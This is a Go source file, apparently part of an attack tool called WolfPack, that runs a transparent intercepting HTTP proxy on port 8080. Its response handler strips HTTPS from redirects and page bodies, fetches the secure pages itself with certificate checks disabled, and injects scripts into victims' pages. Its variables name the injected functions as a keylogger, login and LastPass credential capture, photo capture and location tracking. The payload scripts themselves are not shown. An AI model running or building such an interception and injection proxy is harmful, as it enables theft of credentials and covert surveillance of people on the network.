package controllers

import (
	"bytes"
	"crypto/tls"
	"github.com/abourget/goproxy"
	"io/ioutil"
	"log"
	"net/http"
	"net/http/cookiejar"
	"strings"
)

const (
	CONN_HOST = "0.0.0.0" //allow from all connections
	CONN_PORT = "8080"    //allow on port 8080
	CONN_TYPE = "tcp"     //accept tcp connections

	INJECT_LOGGER_REPLACE = "</body>"
)

var INJECT_LOGGER_RESULT string
var INJECT_PHOTO_RESULT string
var INJECT_LOCATION_RESULT string
var INJECT_LASTPASS_RESULT string
var INJECT_LOGIN_RESULT string

// Provide booleans for each function
var globalStoreHAR bool
var globalRedirects bool
var globalBlocks bool
var globalWolfPack bool
var globalInjectKeyLogger bool
var globalInjectGetLocation bool
var globalInjectGetPhoto bool
var globalInjectGetLogin bool
var globalInjectLastpass bool
var globalProxyStandard bool

func StartSimpleProxy() {

	stoppableListener, _ = New(listener) //create a stoppable listener from the listener
	// Start the proxy.
	proxy := goproxy.NewProxyHttpServer()

	//useful for debugging
	proxy.Verbose = false

	// transparency - turn on in live mode
	proxy.NonProxyHandler = http.HandlerFunc(func(w http.ResponseWriter, req *http.Request) {
	    if req.Host == "" {
	        return
	    }
	        req.URL.Scheme = "http"

	    req.URL.Host = req.Host
	    proxy.ServeHTTP(w, req)
	})
	// Check if we are BLOCKING this page.

	if globalBlocks {
		pageBlock := TriggerBlock()
		//log.Println("blocking")
		proxy.HandleRequest(goproxy.RequestHostContains(banned...)(pageBlock))
	} // end of blocks.

	// // Check if we are REDIRECTING away from this page.
	if globalRedirects {
		pageRedirect := TriggerRedirect()
		proxy.HandleRequest(goproxy.RequestHostContains(redirect...)(pageRedirect))
	} // end of redirect.

	interceptResponse := TriggerWolfPack()

	proxy.HandleResponse(interceptResponse)

	go func() {
		wg.Add(1)
		defer wg.Done()
		http.Serve(stoppableListener, proxy)
	}()

}

// //
func TriggerRedirect() goproxy.HandlerFunc {
	// Create a new pageRedirect handler function to pass back later on.
	pageRedirect := goproxy.HandlerFunc(func(ctx *goproxy.ProxyCtx) goproxy.Next {
		// Get the body for the redirect url.
		body := utilsGetBuffer(strings.Split(ctx.Req.URL.Host, ".")[1]) //get the middle of the url: www.url.com...
		// Set the response-headers before responding.
		client_response := utilsGetHTTPHeaders(body, "text/html", nil)
		ctx.Resp = client_response
		ctx.DispatchResponseHandlers()
		return goproxy.DONE
	})
	return pageRedirect
}

// //
func TriggerBlock() goproxy.HandlerFunc {
	log.Println("blocker")
	// Create a new pageBlocker handler function to pass back later on.
	pageBlocker := goproxy.HandlerFunc(func(ctx *goproxy.ProxyCtx) goproxy.Next {
		// Create the body, very naieve for now.
		body := "<html><body><h1>This site is blocked</h1></body></html>"
		// Set the response-headers before responding.
		client_response := utilsGetHTTPHeaders(body, "text/html", nil)
		ctx.Resp = client_response
		ctx.DispatchResponseHandlers()
		return goproxy.DONE
	})
	return pageBlocker
}

func TriggerWolfPack() goproxy.HandlerFunc {
	jar, _ := cookiejar.New(nil)
	interceptResponse := goproxy.HandlerFunc(func(ctx *goproxy.ProxyCtx) goproxy.Next {

		// Check if the SERVER-RESPOSE is actually giving us a 301/302 redirection.

		if ctx.Resp != nil && (strings.Contains(ctx.Resp.Status, "301") || strings.Contains(ctx.Resp.Status, "302")) {

			// Check if we are directed to an HTTPS page
			//and its an HTML page (i.e not content/styling)
			// Then we kill the original request, and make the connection ourself
            // && strings.Contains(ctx.Resp.Header.Get("Content-Type"), "text/html")
            isHTTPS := strings.Contains(ctx.Resp.Header.Get("Location"), "https")
			if isHTTPS {
                
				ctx.Resp.Request.URL.Scheme = "http"
				ctx.Resp.Header.Set("Location", strings.Replace(ctx.Resp.Header.Get("Location"), "https", "http", -1))
				ctx.Resp.Request.URL.Host = strings.Replace(ctx.Host(), "https", "http", -1)

				tr := &http.Transport{
					TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
				}
				client := &http.Client{
					Transport: tr,
					Jar:       jar,
				}
				server_ssl_response, err := client.Get(ctx.Resp.Header.Get("Location"))
                isHTML := strings.Contains(server_ssl_response.Header.Get("Content-Type"), "text/html")
                if !isHTML {
                    ctx.Resp = server_ssl_response
                    log.Println("forwarding: ", server_ssl_response.Header.Get("Content-Type"))
                    return goproxy.FORWARD
                }

				if err != nil {
					log.Println(" help!: ", err)
				}
				if server_ssl_response.Body == nil {
					return goproxy.NEXT
				}
				bs, err := ioutil.ReadAll(server_ssl_response.Body)
				if err != nil {
					log.Println(err)
				}
				body := string(bs)
				body = strings.Replace(body, "https", "http", -1)
				utilsModifyHeadersForInjection(ctx)
				body = utilsProcessInjectionScripts(ctx, body)
				// Create a response object from the body.
				client_response := utilsGetHTTPHeaders(body, server_ssl_response.Header.Get("Content-Type"), server_ssl_response.Cookies())
				ctx.Resp = client_response
				return goproxy.FORWARD

			} else {
				if ctx.Resp == nil {
					return goproxy.NEXT
				}
				bs, err := ioutil.ReadAll(ctx.Resp.Body)
				if err != nil {
					log.Println(err)
				}
				body := string(bs)
				// strip all https out of the page so that a redirect will be required if necessary
				body = strings.Replace(body, "https", "http", -1)
				utilsModifyHeadersForInjection(ctx)
				body = utilsProcessInjectionScripts(ctx, body)
				ctx.Resp.Body = ioutil.NopCloser(bytes.NewBufferString(body))
				return goproxy.NEXT
			}

		} else { // end of 301-302 redirects.
			//here need to handle HTTP requests.
			//its just an HTTP page no...?
			if ctx.Resp == nil {
				return goproxy.NEXT
			}
			bs, err := ioutil.ReadAll(ctx.Resp.Body)
			if err != nil {
				log.Println(err)
			}
			body := string(bs)
			// strip all https out of the page so that a redirect will be required if necessary
			body = strings.Replace(body, "https", "http", -1)
			utilsModifyHeadersForInjection(ctx)
			body = utilsProcessInjectionScripts(ctx, body)

			ctx.Resp.Body = ioutil.NopCloser(bytes.NewBufferString(body))
			return goproxy.NEXT
		}

		return goproxy.NEXT
	}) // end of the proxy OnResponse.
	return interceptResponse
}
